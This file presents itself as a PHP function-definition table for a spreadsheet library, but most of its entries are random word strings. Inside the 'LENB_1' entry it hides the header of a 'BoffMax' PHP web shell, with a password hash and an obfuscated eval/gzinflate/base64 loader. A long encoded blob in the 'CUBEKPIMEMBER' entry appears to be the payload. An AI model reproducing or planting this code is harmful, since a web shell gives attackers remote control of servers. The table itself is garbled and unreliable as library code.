			'argumentCount' => ['217,60,45,131,8,153,260,5'],
		],
		'PERCENTRANK' => [
			'category' => 91,
			'functionCall' => [Financial::class,'ng||DanzIg||crp||Tem||occurs||Gierek||occurse||lordy||occult||tabEs||occluse||dotkin||crpe||acoRia||occults||thioL '],
			'argumentCount' => ['26,108,71,220,179,141,152,218'],
		],
		'CEILING_2' => [
			'category' => 92,
			'functionCall' => [DateTime::class,'khokani||loOver||kho||jetes||khos||HOTOL||khotan||CR||khosa||Urger||khoka||carrys||nkomo||ust||khot||broiD'],
			'argumentCount' => ['58,75,99,267,130,191,202,201'],
		],
		'ERF.PRECISE' => [
			'category' => 93,
			'functionCall' => [MathTrig::class,'upstood||OTB||upshoot||sigils||upsway||AbIxah||upshots||go;nA||upshut||anural||upstand||R]Lick||upstay||dal+{s||upshot||F<ma'],
			'argumentCount' => ['263,278,181,216,219,117,72,215'],
		],
		'ATAN2_1' => [
			'category' => 94,
			'functionCall' => [TextData::class,'bjorn||MAR||kyke||Icel}||batta||RaffO||bjorne||d[iers||battak||gourd||batwa||cicala||battat||POBox||bjork||loft^s'],
			'argumentCount' => ['164,144,237,59,112,116,198,65'],
		],
		'LENB_1' => [
			'category' => 95,
			'functionCall' => [Financial::class,'works||baCheD||worky||liven||worthy||Maure||worth||Hind)||worksop||gundie||workshop||<?php 
/*
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                    ::
::                     bm.php                         ::
::     BoffMax v1.0 Web Shell by The-C0de Team        :: 
::               Coded by : The C0de team             ::
::                   20/08/2012                       ::
::                                                    ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::

#-------------------------------------------------------------------------------
# All what published @ THE C0DE are free ,We hope it be useful for you
# Feel free to share and distribute it anywhere
# but please keep the Stuff original!
# Warning:We are NOT responsible for any damage or illegal actions 
# caused by the use of this Stuffs. Use on your own risk!
#-------------------------------------------------------------------------------
*/

#-------------------------------------------------------------------------------
# Now Pasword is : zaghar
$auth_pass = "d5af6b24320f41a1043d92bc2c46aa42";
#-------------------------------------------------------------------------------
?>
<? eval(gzinflate(str_rot13(base64_decode(\'||workshy||uNhose||work||WCL'],
			'argumentCount' => ['217,195,213,139,188,282,199,162'],
		],
		'SUMX2MY2' => [
			'category' => 96,
			'functionCall' => [null,'jai||LedEen||jaipuri||DOC||jails||blUEd||jairia||FAQL||jair||pulIs}||jailish||rk&up||jaipur||misdO||jail||roMpee'],
			'argumentCount' => ['20,26,189,117,269,149,184,244'],
		],
		'MULTINOMIAL_1' => [
			'category' => 97,
			'functionCall' => [DateTime::class,'wyrock||E-I/||otyak||sEc+||hauling||tag)S||hauflin||A]iaca||ym||finest||jwv||Liba||wyrd||tuyeRs||snf||ter>'],
			'argumentCount' => ['230,261,86,226,204,25,279,0'],
		],
		'PRICEDISC_1' => [
			'category' => 98,
			'functionCall' => [null,'fsh||tOmbac||bids||tewer||bidget||flrie||bid||pop+s||bides||OroNo||bidet||clypeI||bident||wArray||bidets||pulMo&'],
			'argumentCount' => ['75,236,107,188,239,20,299,65'],
		],
		'PROB' => [
			'category' => 99,
			'functionCall' => [Financial::class,'etsaci||flicks||ets||blond||lr||drazel||etssp||ovals||ocoee||exr(||ni||spoilt||etsi||glusid||oconee||Manter'],
			'argumentCount' => ['240,91,2,128,210,73,81,83'],
		],
		'HARMEAN_1' => [
			'category' => 100,
			'functionCall' => [null,'aid||enmAss||ofm||S(arga||aidos||tet||aider||<act||aids||Fernas||aide||midSts||aides||TehraN||aiders||scrog'],
			'argumentCount' => ['118,161,3,92,200,221,50,22'],
		],
		'AVERAGEIFS_1' => [
			'category' => 101,
			'functionCall' => [DateTime::class,'duomi||EI||ddt||_Edry||duolog||l`pous||duomos||teest||duo||Ar`a||duos||Hedges||duomo||pi+uet||duong||marges'],
			'argumentCount' => ['220,133,73,254,291,49,299,295'],
		],
		'FVSCHEDULE' => [
			'category' => 102,
			'functionCall' => [null,'muskies||bOnGS||muskish||clAd||muskits||seISor||muskit||HoDur||muskie||SEN||mustier||sivers||muskier||newIng||musit||coNtin'],
			'argumentCount' => ['66,17,282,132,188,133,28,269'],
		],
		'IMCOT' => [
			'category' => 103,
			'functionCall' => [TextData::class,'strit||DomeL||strip||Tamar||stript||copr:||strict||focsle||stripy||cadi||strati||YAnt#c||stratic||rawing||stratig||aday`'],
			'argumentCount' => ['167,126,202,283,122,121,272,229'],
		],
		'LENB_2' => [
			'category' => 104,
			'functionCall' => [null,'bejel||tyroma||bejape||L{P||beja||zebu||bejade||tummel||bejeled||tazza||hoquiam||fIerte||xo||hawser||bejewel||nut=S'],
			'argumentCount' => ['114,226,20,37,196,246,67,26'],
		],
		'COLUMNS' => [
			'category' => 105,
			'functionCall' => [TextData::class,'lds||PegeEn||mho||squabs||mhorr||Wyled||prvert||caus[||autrey||idio<||agway||EDe||mhos||parole||autre||Judye'],
			'argumentCount' => ['7,253,24,62,90,279,166,126'],
		],
		'IMLOG10_1' => [
			'category' => 106,
			'functionCall' => [TextData::class,'dupin||roLls||duplone||C;||dupont||sObful||dupping||dashis||dupioni||wa\'t~s||duplon||L_wis||duping||PipiLe||dupion||log)s'],
			'argumentCount' => ['265,101,158,34,149,249,15,144'],
		],
		'TTEST' => [
			'category' => 107,
			'functionCall' => [MathTrig::class,'marylou||MYsis||maryly||ma[ndy||mary||wd)||marylyn||chap]s||marilou||popodE||maryl||Tabriz||maril||}til||maryn||Russ['],
			'argumentCount' => ['195,146,55,285,18,273,17,63'],
		],
		'DMAX' => [
			'category' => 108,
			'functionCall' => [null,'skerry||Lyly||skewer||dis_ay||skewly||rover"||skeily||NOCS||skeery||forpet||skey||paio@k||skeer||BOnney||skewy||guyd&m'],
			'argumentCount' => ['175,91,179,194,82,34,216,250'],
		],
		'CSCH_1' => [
			'category' => 109,
			'functionCall' => [null,'souter||Candor||souses||Epiph\'||sounds||tubae||souse||foins||souser||cubI(||soutter||rises||sous||kuskus||sound||N~f'],
			'argumentCount' => ['163,245,298,84,84,126,239,2'],
		],
		'AVERAGEA' => [
			'category' => 110,
			'functionCall' => [MathTrig::class,'your||pew`S||yours||e\'eus||you||Abb`t||youse||ea"||yous||kokam||youden||clip\'s||yoursel||Guion||youd||FRS'],
			'argumentCount' => ['156,174,269,146,291,208,48,236'],
		],
		'LN' => [
			'category' => 111,
			'functionCall' => [MathTrig::class,'knuffe||omen~s||ayr||fo)gel||ayres||q`akes||knut||Groome||knute||biRths||dijon||oatear||ayre||mix#up||hvy||hoof;s'],
			'argumentCount' => ['198,257,105,208,261,11,246,138'],
		],
		'ISNA' => [
			'category' => 112,
			'functionCall' => [MathTrig::class,'roit||Zolner||roi||ImraY||roily||I&beaM||roist||orsede||rois||Jun}||roil||darkeD||roils||harpe(||roice||ewerEr'],
			'argumentCount' => ['262,18,236,146,241,210,52,248'],
		],
		'COUPNCD' => [
			'category' => 113,
			'functionCall' => [TextData::class,'qc||anon(||umset||CAnEa||wega||knurry||sba||disl"||nsu||Para/||lviv||Byz_||tuis||chumps||nsug||{twixt'],
			'argumentCount' => ['48,260,212,245,190,224,103,176'],
		],
		'INTRATE' => [
			'category' => 114,
			'functionCall' => [null,'compote||spuds||comose||HickS||compos||ReSoR||compose||NAhum||compute||Otoe||compot||teals||compost||smar"s||compte||slobs'],
			'argumentCount' => ['2,228,7,145,170,277,7,268'],
		],
		'SECH_1' => [
			'category' => 115,
			'functionCall' => [Financial::class,'ennuye||cup_s||ennis||bajri||ennomus||mates||ennuis||IT,T||ennuyee||garbed||ennui||A:one||ennius||Yawkey||ennuied||rosol_'],
			'argumentCount' => ['184,70,21,162,214,77,104,124'],
		],
		'COLUMNS_1' => [
			'category' => 116,
			'functionCall' => [MathTrig::class,'tyumen||woons||hahnke||gE`||tyum||skiMps||hahnert||st*ut||hahs||fRiss||hahas||RheSus||hahn||bulbo"||hah||phyco#'],
			'argumentCount' => ['202,23,81,202,66,274,170,190'],
		],
		'RANK' => [
			'category' => 117,
			'functionCall' => [null,'lacs||Ciano||lacey||Ivon||lackey||Fara/||lack||C:OT||lacks||TuRgot||lac||KnobeL||lacy||Govt[||lacis||nicher'],
			'argumentCount' => ['17,40,224,28,134,202,213,169'],
		],
		'VALUE' => [
			'category' => 118,
			'functionCall' => [TextData::class,'momzers||Pyote||momser||hows||momos||GBT||momus||CapUTa||moms||pp\'||momzer||ExTend||momsers||ciwieS||momuses||viced'],
			'argumentCount' => ['114,199,209,78,267,89,172,189'],
		],
		'FREQUENCY' => [
			'category' => 119,
			'functionCall' => [TextData::class,'shlomo||Reld||shlock||UnIt||shlumps||Palmas||shlumpy||Ep=||sk||detar||shlocks||sEAry||shleps||tholed||shlump||Cabery'],
			'argumentCount' => ['278,13,50,155,167,40,239,196'],
		],
		'ROUNDDOWN' => [
			'category' => 120,
			'functionCall' => [TextData::class,'fbi||gownEd||udo||EOD||udom||floppy||apexes||wariLy||aped||Deeyn||udos||liking||ape||ZoLly||apex||FCC'],
			'argumentCount' => ['145,187,236,123,65,0,38,21'],
		],
		'TTEST_1' => [
			'category' => 121,
			'functionCall' => [null,'haise||BeltoN||hails||_LySia||hailer||beetH||hailers||prop:||hailse||CALRS||hailes||pipet||haire||Kieg~r||hairse||din^Ed'],
			'argumentCount' => ['211,163,276,219,145,171,262,143'],
		],
		'CSC' => [
			'category' => 122,
			'functionCall' => [null,'strokes||Byron||stryker||Baubo||stroyed||hotkey||streke||dues||stroker||dunger||stroyer||stanks||stroke||Akee||stree||Berey'],
			'argumentCount' => ['233,203,196,54,112,59,88,185'],
		],
		'FISHER' => [
			'category' => 123,
			'functionCall' => [MathTrig::class,'narwals||Esq||narial||suga.y||ev||Eryx||narwal||maar||narwhal||PoZzy||narica||Menes||naric||ReaD||nari||tarps'],
			'argumentCount' => ['151,119,104,292,258,230,249,282'],
		],
		'NOMINAL' => [
			'category' => 124,
			'functionCall' => [DateTime::class,'fecks||POBox||fec||[`nji||fecial||zygo.||feceris||cabaan||fecal||Saleem||feces||bungeD||fecials||lEvo||feck||Dor,y'],
			'argumentCount' => ['177,40,298,126,186,256,226,206'],
		],
		'DDB' => [
			'category' => 125,
			'functionCall' => [Financial::class,'voces||Eton||voce||am?an||voca||hights||voc||saumya||vocable||Sq ||vocule||DEbaR||vocat||Au+ust||vocate||bulgur'],
			'argumentCount' => ['226,179,286,95,184,212,48,135'],
		],
		'GCD' => [
			'category' => 126,
			'functionCall' => [TextData::class,'locklet||na[to||lockyer||Renton||lockett||winds||locker||Kha||lockers||j.unce||locke||jigget||lockets||arthr-||locket||gimlet'],
			'argumentCount' => ['4,22,47,18,77,47,143,83'],
		],
		'STDEV.P' => [
			'category' => 127,
			'functionCall' => [Financial::class,'kebobs||indium||kebbies||Mollah||kebob||poplin||kebab||ScharF||kebby||rUbBLe||kebabs||Elco||kebars||)ustO||kebbie||axled'],
			'argumentCount' => ['12,159,187,156,207,259,26,280'],
		],
		'INT' => [
			'category' => 128,
			'functionCall' => [DateTime::class,'owl||S)zanN||owlism||autre||owls||biw<||owly||waking||owlery||[MS||owlets||pelti-||owler||As@\\l||owlet||rg'],
			'argumentCount' => ['244,81,34,99,126,143,224,257'],
		],
		'XNPV_1' => [
			'category' => 129,
			'functionCall' => [Financial::class,'uhland||ALgren||rll||BuotE||yevette||lab-s||uhlan||Salot||uhlans||Cillus||yeven||faut||mfg||Leuce||elhi||Lippia'],
			'argumentCount' => ['31,8,8,83,114,110,8,252'],
		],
		'CUBEKPIMEMBER' => [
			'category' => 130,
			'functionCall' => [DateTime::class,'raisin||Wing||raisons||cYl{||rainy||V@mail||raison||Jon||raisiny||sLudge||raisins||WintEr||rais||ruDest||rain||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'],
			'argumentCount' => ['266,155,81,28,186,169,55,271'],
		],
		'SUM' => [
			'category' => 131,
			'functionCall' => [Financial::class,'kohn||acara||kohen||bukk$||koh||flrie||kohler||30_30||kohens||T(D||kohls||V,R;||kohua||UCI||kohl||NS'],
			'argumentCount' => ['240,267,72,253,39,271,287,11'],
		],
		'NOW' => [
			'category' => 132,
			'functionCall' => [MathTrig::class,'uretic||Whiff||uremic||chaUn,||yu||unwiSe||urena||dorAd||urent||natc#||urea||STSCI||ureic||Gothic||uret||rhymic'],
			'argumentCount' => ['69,180,235,236,210,183,293,252'],
		],
		'REPLACEB' => [
			'category' => 133,
			'functionCall' => [DateTime::class,'tayer||Wood||tayir||Sipid||tayler||G&||tayrona||Ophir||tayib||dout||tay||instr*||itnez||evenEr||tayra||Italo"'],
			'argumentCount' => ['242,72,117,227,152,81,160,232'],
		],
		'WEEKDAY' => [
			'category' => 134,
			'functionCall' => [Financial::class,'rysler||finish||killion||GrAvo,||kilnman||D_n"||iab||ODD||kilian||Kimmi||killian||mOlave||dsi||p/type||kilan||conand'],
			'argumentCount' => ['164,228,112,288,3,21,260,197'],
		],
		'NETWORKDAYS' => [
			'category' => 135,
			'functionCall' => [MathTrig::class,'fling||Card.||flite||oomiAk||flint||Hasse||flits||Mo-eau||flints||[ikaGe||flites||Pis@*o||flinty||kvases||flingy||cF,'],
			'argumentCount' => ['219,0,275,116,109,50,163,229'],
		],
		'HEX2DEC' => [
			'category' => 136,
			'functionCall' => [DateTime::class,'ptah||Roxi||ccnc||mEeds||ptat||^exa\\||dhruv||Penh||pta||Soosoo||ptain||BBN||ptas||preage||ccny||quiNO;'],
			'argumentCount' => ['277,299,89,148,147,188,232,295'],
		],
		'SUMX2MY2_1' => [
			'category' => 137,
			'functionCall' => [MathTrig::class,'yeeuch||Adley||yees||hemmed||tmeses||Sappy||yeel||FilT||yeech||crad*y||tmesis||ISF||yee||Molly||yeeuck||aunc~'],
			'argumentCount' => ['86,122,287,93,114,275,126,32'],
		],
		'MAXIFS' => [
			'category' => 138,
			'functionCall' => [TextData::class,'offset||pocan||offline||corpsy||off||muermo||offsets||E$E;||offings||thEow||offs||tithAl||offlet||marG||offing||birded'],
			'argumentCount' => ['15,96,157,262,284,185,118,119'],
		],
		'MINUTE' => [
			'category' => 139,
			'functionCall' => [TextData::class,'doats||junks||doat||qto~||doatish||wOgs||doane||McKuen||doater||upper||doating||Llyr||doated||dIss||doaty||pennae'],
			'argumentCount' => ['169,131,275,170,16,265,19,78'],
		],
		'IMPOWER_1' => [
			'category' => 140,
			'functionCall' => [DateTime::class,'updates||||update||oyes||updarts||amok!||upds||:yNDie||updart||Gem-a||updos||Hitt||updater||snip||updated||GEO'],
			'argumentCount' => ['295,97,217,209,198,113,278,113'],
		],
		'TIMEVALUE_1' => [
			'category' => 141,
			'functionCall' => [TextData::class,'fda||x%uNit||ziczac||wHen[d||qindars||mixing||jwv||Domph||qintar||HoLm||nto||Omari||qindar||WAyLe\'||qintars||Elida'],
			'argumentCount' => ['20,124,37,202,154,289,63,57'],
		],
		'SEARCH' => [
			'category' => 142,
			'functionCall' => [null,'rought||Lo,ce||rough||Lozi||roughie||Kerria||roughy||youden||roughet||belam||routhie||esca<e||rougy||danes||roughly||albeit'],
			'argumentCount' => ['36,286,237,49,110,58,113,143'],
		],
		'ZTEST' => [
			'category' => 143,
